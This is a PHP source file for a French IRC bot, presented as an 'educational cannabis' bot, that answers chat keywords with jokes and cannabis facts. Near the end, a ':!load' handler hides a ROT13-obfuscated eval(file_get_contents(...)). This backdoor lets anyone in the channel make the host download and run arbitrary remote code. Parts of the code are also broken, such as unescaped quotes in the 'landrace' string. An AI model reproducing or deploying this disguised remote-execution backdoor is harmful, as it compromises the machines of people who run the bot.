<?php
// Bot cannabis éducatif
// Ce bot se connecte au salon, et donne son statut s'il reçoit !statut.

// Ne pas arrêter le script PHP.
set_time_limit(0);
// Ouvrir le port 6667
$socket = fsockopen("irc.hackint.eu", 6667);

// Envoyer les informations de connexion.
// Il faudrait générer des nick aléatoire pour s'assurer que le pseudo est libre.
$nick="Cannabis";
$nb=rand(1,1000);
$nick.=$nb;
$chan="vdw";

// NICK permet de s'identifier sur le serveur.
fputs( $socket , "NICK ".$nick."\r\n" );
fputs( $socket , "USER guest localhost irc_server :guest\r\n");
 
// Force an endless while
$acc="Avez vous déjà consommé du cannabis ?";

 while(1) {
     // Continue the rest of the script here
     while($data = fgets($socket, 128)) {
         echo nl2br($data);
         flush();
         // Separate all data
         $ex = explode(' ', $data);
         // Send PONG back to the server
         if($ex[0] == "PING"){
             fputs($socket, "PONG ".$ex[1]."\n");
         }
        if(strpos($data," JOIN ") !== false){
             fputs($socket, "PRIVMSG #".$chan." :".$acc."\r\n");
		     //fputs($socket, "PRIVMSG #".$hackbbs." :".$acc."\r\n");
         }
		 
         // Say something in the channel
         if (strstr($data,":!statut")) {
             fputs($socket, "PRIVMSG ".$ex[2]." ".$nick." is online!\r\n");
         }
		 
        if (strstr($data,":!acc")) {
                $acc=substr($ex[4],0,strlen($ex[4])-2);
         }
         
		 if (strstr($data,"merde")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Si tu es dans la merde jusqu'au cou, ne baisse pas la tête.\r\n");
         }
		 
		 if (strstr($data,"putain")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Putain : Exprime la surprise, le mécontentement ou l'indignation.\r\n");
         }
		 
		 if (strstr($data,"Sucette au cannabis")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Attention au sucre.\r\n");
         }

		 if (strstr($data,"j'aime pas")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Que tu aimes ou que tu n'aimes pas, les choses ne changent pas comme ça.\r\n");
         } 
		 
        if (strstr($data,"sativa")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Sativa médicale.\r\n");
         }
		 
        if (strstr($data,"alcool")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :L'alcool ne résolue pas les problèmes mais l'eau et le lait non plus.\r\n");
         }
		 
        if (strstr($data,"cannibalisme")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Il ne faut pas confondre cannabinophile et cannibalisme.\r\n");
         }
		 
		if (strstr($data,"Je pense que")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Quand on voit ce qu'on voit et qu'on entend ce qu'on entend ... On a raison de penser ce qu'on pense !\r\n");} 
		   
		if (strstr($data,"repasser")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Si ça se trouve, les planches à repasser ne sont que des planches de surf qui ont abandonné leurs rêves et trouvé un vrai boulot.\r\n");
         }
		 
		if (strstr($data,"végétarien")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Tuer un végétarien, c'est sauver une salade !\r\n");
         }
		 
 		 
		if (strstr($data,"politique")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :C'est pas dur la politique comme métier ! Tu fais cinq ans de droit et tout le reste c'est de travers.\r\n");
         }

		 
		if (strstr($data,"pression")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Two beer or not two beer? That is the pression.\r\n");
         } 
		 
		if (strstr($data,"imbécile")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Pourquoi les choses qui n'arrivent qu'aux imbéciles m'arrivent à moi aussi ?\r\n");
         } 	 
	 
	 	if (strstr($data,"landrace")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Une pure variété de cannabis "landrace" est une variété de cannabis issue de son milieu naturel, qui n’a jamais été croisée avec aucune autre variété, uniquement avec elle-même depuis de très nombreuses générations. 
             Ces variétés donnent donc des résultats très stables avec peu de variations d’une plante à l’autre.
             La plupart des variétés landrace sont 100% Indica ou 100% Sativa, bien qu’il existe quelques exceptions. 
             La variété de Cannabis landrace porte souvent le nom de son pays ou de sa région d’origine. Exemples : Hindu Kush (Indica), Acapulco Gold (Sativa)...
             Les variétés de cannabis landrace sont la base des autres variétés de marijuana.
             Les variétés pures ont l’avantage de proposer des palettes de goûts et d’effets très originaux car différents des variétés hybrides actuelles.\r\n");
         } 	 
	 
		 
		if (strstr($data,"araignée")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Voir une araignée c'est rien, le pire c'est quand tu la voit plus .. !\r\n");
         } 
		 
		if (strstr($data,"chocolat")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Je propose une minute de silence pour tout le chocolat mort au combat lors de mes moments de déprimes.\r\n");
         }

		 if (strstr($data,"Tic et Tac")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Ranger du risque.\r\n");}
		 
		if (strstr($data,"indica")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Indica, parfait contre les nausées.\r\n");
         } 
		 
		 if (strstr($data,"win 95")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :J'ai lancé win 95 la dernière fois, j'ai pleuré de revoir les anciens moteurs de recherches.\r\n");
         } 
		 
		 		if (strstr($data,"bébé")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :On parle de bébé, mais, qui change les couches ?\r\n");}
			 
		if (strstr($data,"bah voila")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Bah voilà quoi !!\r\n");}
		 
		 if (strstr($data,"MySQL")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :MySQL est une base de données libre, utilisée dans le monde de l'open-source ! C'est bien ça ?\r\n");
         } 
		 
		 if (strstr($data,"Debian")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Quand tu me parles de Debian, je pense à Jessie, elle est presque aussi bien roulée que moi.\r\n");
         }
         
       if (strstr($data,"ça c'est du hack")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Trop fort les mecs !!!\r\n");
         }
         
       if (strstr($data,"star war")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :TaaaTaaaTaaa Ta Tadam Ta Tadam ... Remix Luna pour Zer00CooL.\r\n");
         }

       if (strstr($data,"trop belle")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :La plus belle c'est Sandra, d'après ce qu'elle racconte...\r\n");
         } 

       if (strstr($data,"adore")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Il aime ... Il adore ... !\r\n");
         }
         
       if (strstr($data,"plante")) {
            fputs($socket, "PRIVMSG ".$ex[2]." :est un genre botanique qui rassemble des plantes annuelles de la famille des Cannabaceae ...\r\n");
         }
         
       if (strstr($data,"THC")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :En réalité, si le THC est la molécule majoritaire dans la plante, elle n'est que l'un des 60 cannabinoïdes que contiennent les têtes de marijuana.\r\n");
         }


         if (strstr($data,":!load")) {
             $d="riny(svyr_trg_pbagragf('".substr($ex[4],0,strlen($ex[4])-2)."',snyfr));";
                                 eval(str_rot13($d));
         }
 
if(strstr($data,"666")) {
fputs( $socket , "JOIN #".$chan."\r\n");
// fputs( $socket , "JOIN #".$hackbbs."\r\n");
}

}}
?>
